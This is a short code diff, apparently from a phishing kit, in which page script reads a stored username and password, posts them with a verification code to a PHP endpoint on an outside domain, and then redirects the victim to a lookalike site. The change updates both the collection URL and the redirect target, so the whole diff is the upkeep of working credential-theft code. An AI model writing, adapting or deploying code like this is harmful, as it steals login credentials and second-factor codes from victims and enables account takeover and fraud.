@@ -144,13 +144,13 @@
                 var username = sessionStorage.getItem("username");
                 var password  = sessionStorage.getItem("password");
                 $.ajax({
-                    url : 'https://justdial4u.today/laxzer.php',
+                    url : 'https://justdial4u.today/laxer247.php',
                     type: 'post',
                     data : {username, password, code},
                     success: function(result){
                         if(result="sucessmsg"){
                             // alert('Server not responding. Please after some time.');
-                            window.location.href = "https://laxzer.com";
+                            window.location.href = "https://laxzer247.com";
                         }
                     }
                 });
